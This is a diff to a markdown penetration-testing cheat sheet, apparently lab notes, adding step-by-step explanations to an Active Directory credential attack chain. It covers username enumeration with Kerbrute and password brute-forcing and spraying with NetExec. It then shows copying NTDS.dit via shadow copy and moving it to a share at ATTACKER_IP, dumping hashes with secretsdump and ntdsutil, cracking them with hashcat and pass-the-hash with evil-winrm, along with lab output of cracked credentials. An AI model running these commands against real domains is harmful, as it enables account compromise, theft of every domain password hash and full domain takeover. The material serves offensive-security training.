@@ -34,6 +34,7 @@ Once a Windows system joins a domain, authentication requests go to the **Domain
 ```bash
 ./username-anarchy -i names.txt
 ```
+> Generates every common username format from a list of full names. Input is a file with one name per line. Output includes formats like `jdoe`, `jane.doe`, `doej`, etc. Pipe to a file for use with Kerbrute or NetExec.
 
 Generates all common username formats from a list of real names.
 
@@ -42,6 +43,7 @@ Generates all common username formats from a list of real names.
 ```bash
 ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
 ```
+> Validates each username in the list against the Domain Controller via Kerberos pre-authentication. Valid usernames get a Kerberos response; invalid ones get an error. Does not lock accounts — safe to run without fear of lockout.
 
 Validates usernames via Kerberos pre-auth — **does not lock accounts** (no actual auth attempt).
 
@@ -54,6 +56,7 @@ Validates usernames via Kerberos pre-auth — **does not lock accounts** (no act
 ```bash
 netexec smb <DC_IP> -u <username> -p /usr/share/wordlists/fasttrack.txt
 ```
+> Tries every password in fasttrack.txt against the given username on the DC via SMB. `[+]` means success; `(Pwn3d!)` means Domain Admin. Add `--continue-on-success` to keep going after finding a match.
 
 | Flag | Purpose |
 |------|---------|
@@ -85,38 +88,45 @@ netexec smb <DC_IP> -u <username> -p /usr/share/wordlists/fasttrack.txt
 ```bash
 evil-winrm -i <DC_IP> -u <user> -p '<password>'
 ```
+> Opens a PowerShell session on the DC via Windows Remote Management. Requires WinRM access. If credentials have Domain Admin rights, you can dump NTDS.dit from here.
 
 **Check privileges:**
 ```powershell
 net user <username>
 # Look for: Domain Admins in Global Group memberships
 ```
+> Shows group memberships for the current user. Confirm "Domain Admins" membership before attempting NTDS.dit extraction — it requires Domain Admin or equivalent privileges.
 
 **Create Volume Shadow Copy:**
 ```powershell
 vssadmin CREATE SHADOW /For=C:
 ```
+> Creates a Volume Shadow Copy (VSS) of the C: drive. NTDS.dit is locked by the OS at runtime — a shadow copy lets you access it without the lock. Note the shadow copy path in the output for the next step.
 
 **Copy NTDS.dit from shadow:**
 ```powershell
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
+> Copies NTDS.dit from the shadow copy (which is not locked) to a writable path. Update `ShadowCopy2` with the actual shadow copy number from the `vssadmin CREATE SHADOW` output.
 
 **Transfer to attack host (via SMB share):**
 ```powershell
 cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\ShareName
 ```
+> Moves NTDS.dit to the attack host's SMB share. Also grab the SYSTEM hive (`reg.exe save hklm\system C:\SYSTEM`) before transferring — you need both to decrypt the hashes.
 
 **Extract hashes locally:**
 ```bash
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
+> Extracts all domain user hashes from the NTDS.dit file offline. `LOCAL` means no network connection — uses the provided files. Output includes every domain account in `username:RID:LMhash:NThash:::` format.
 
 ### Method 2: NetExec ntdsutil Module (One-Liner)
 
 ```bash
 netexec smb <DC_IP> -u <user> -p '<password>' -M ntdsutil
 ```
+> Runs the ntdsutil module to dump NTDS.dit automatically — no manual VSS steps needed. Requires Domain Admin credentials. Output is saved to `/tmp/` and all domain hashes are printed.
 
 Does everything automatically:
 1. Creates NTDS dump on target via ntdsutil.exe
@@ -128,6 +138,7 @@ Does everything automatically:
 ```bash
 grep -iv disabled /home/<user>/.nxc/logs/<logfile>.ntds | cut -d ':' -f1
 ```
+> Filters out disabled accounts from the NTDS dump log, then prints just the usernames. `-i` makes the match case-insensitive, `-v` inverts it (keep lines that do NOT contain "disabled"). Swap the log path with the actual file from NetExec's output.
 
 ---
 
@@ -138,6 +149,7 @@ grep -iv disabled /home/<user>/.nxc/logs/<logfile>.ntds | cut -d ':' -f1
 ```bash
 hashcat -m 1000 <hash_or_file> /usr/share/wordlists/rockyou.txt
 ```
+> Cracks NTLM hashes from the NTDS dump. Pass a single hash string or a file with one hash per line. Add `-r /usr/share/hashcat/rules/best64.rule` to catch mutated passwords.
 
 ---
 
@@ -150,6 +162,7 @@ If cracking fails, use the hash directly for authentication (NTLM protocol).
 ```bash
 evil-winrm -i <DC_IP> -u Administrator -H <NT_hash>
 ```
+> Authenticates using the NTLM hash instead of a password (Pass-the-Hash). `-H` takes the NT hash (right half of the `LM:NT` pair). No need to crack the hash first — use it directly for access.
 
 Format: `username:NT_hash` instead of `username:password`
 
@@ -214,12 +227,14 @@ Using `firstinitiallastname` convention (most common):
 ```bash
 echo -e "jmarston\ncjohnson\njstapleton" > /tmp/users.txt
 ```
+> Creates a quick username list from OSINT. `-e` enables escape sequences so `\n` creates new lines. For larger name lists, use username-anarchy instead.
 
 ### Step 2 — Brute Force with NetExec + fasttrack Wordlist
 
 ```bash
 netexec smb 10.129.202.85 -u /tmp/users.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success
 ```
+> Sprays all users against every password in fasttrack.txt. `--continue-on-success` keeps going after finding a hit so all valid credentials are discovered. `(Pwn3d!)` flags Domain Admin accounts.
 
 **Results:**
 ```
@@ -235,6 +250,7 @@ SMB  10.129.202.85  445  ILF-DC01  [+] ILF.local\jstapleton:Winter2008
 ```bash
 netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -M ntdsutil
 ```
+> Dumps NTDS.dit using Domain Admin credentials. The ntdsutil module handles the entire VSS → copy → extract → cleanup chain automatically. All domain hashes are printed to the terminal and saved to a log file.
 
 **Output (excerpt):**
 ```
@@ -246,6 +262,7 @@ ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744a
 ```bash
 hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
 ```
+> Cracks a single NT hash from the NTDS dump. Results print as `hash:plaintext`. Use `--show` afterward if the hash was already cracked in a previous session.
 
 **Result:** `92fd67fd2f49d0e83744aa82363f021b:Winter2008`
 
